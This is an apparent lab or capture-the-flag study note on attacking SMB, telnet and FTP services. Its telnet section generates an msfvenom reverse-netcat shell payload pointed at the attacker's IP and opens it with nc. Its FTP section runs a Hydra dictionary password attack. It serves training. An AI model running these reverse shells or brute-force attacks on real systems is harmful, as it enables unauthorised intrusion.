---
tags:
  - programming/hacking/networking
  - programming/linux
---
# Network services

In this section we will be exploiting network service

SMB - client-server communication protocol for share access to network resource. "Sambda" for Unix

## SMB Enumeration

Find what we want effectively - don't waste time

### Enum3Linux

Enumeration for linux that works on both linux and windows systems. 

Quick and dirty command options
```
    -U  get userlist
    -M  get machine list
    -N  get namelist dump (different from -U and-M)
    -S  get sharelist
    -P  get password policy information
    -G  get group and member list
    -a  all of the above (full basic enumeration)
```

### SMB client

Use SMB client to try and access the data

```
    smbclient //[IP]/[SHARE]
```

SMB share called "secret" as user "suit" on machine 10.10.10.2 on default port - Like this: `smbclient //10.10.10.2/secret -U suit`

Lets get anonymous access to the profiles share! `smbclient //10.10.10.2/profiles -U anonymous` and enter blank password

Find the ssh key, download it and use it to log in as the user mentioned in the note - guess and check the name (it's
the last name)

### Telnet

Like sambda, but different. Sends all message in clear text and has no security. Almost entirely replaced by ssh, but if
you find it, you are set to bust in. 

Syntax: `telnet [ip] [port]`. Then use specific telnet commands to communicate with server

Telenet enumeration finds nothing below 1000, however we an expand the port range to all possible `nmap -A -p- $ipaddr
| tee nmap_telnet.log` Of course, using the tee command to save the output or later

NOTE - "skidy's backdoor" is particularly interesting

Now - lets just see if we can log on to the telnet service using `telnet $IP $PORT

We can connect to that, but the output is not being returned. We can check the output is being returned by listening on
our local machine `sudo tcpdump ip proto \\icmp -i tun0` and then pinging our local machine useing `ping [local tun0 ip]
-c 1`

That should return some values, which means the target machine is running our commands, but not telling us. We can then
create a reverse shell using msfvenom
`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
This will generate a payload that we can then copy and paste into the telnet session. Be sure to run `nc -lvp $LISTENPORT` on the local machine to actually open the reverse shell and use it

Find the flag, and we're done! 

### FTP

File Transfer Protocol transfers files. Has a command channel and a data channel for operation. Validates the
username/password and then the user can execute commands on the FTP server

Two modes - Active and Passive. Active mean the server has to actively connect to the client, where passive allow the
server to just listen for incoming connections

FTP typically operates on port 21

Fun fact - some versions of FTP have an exploit where they can run `cwd` before authentication. See [this link]: https://www.exploit-db.com/exploits/20745

This particular scan will require a scan on all ports. `-A

Can connect to the FTP site by using `ftp $IPADD`

We can see a note that might give us a username. Let's try Hydra to crack the password using the command `hydra -t 4 -l
mike -P /usr/share/wordlists/rockyou.txt $IPADDR ftp`

```
    hydra                   Runs the hydra tool
    -t 4                    Number of parallel connections per target
    -l [user]               Points to the user who's account you're trying to compromise
    -P [path to dictionary] Points to the file containing the list of possible passwords
    -vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
    [machine IP]            The IP address of the target machine
    ftp / protocol          Sets the protocol
```

Get password and log in with the username/password found. Find flag and we're done!
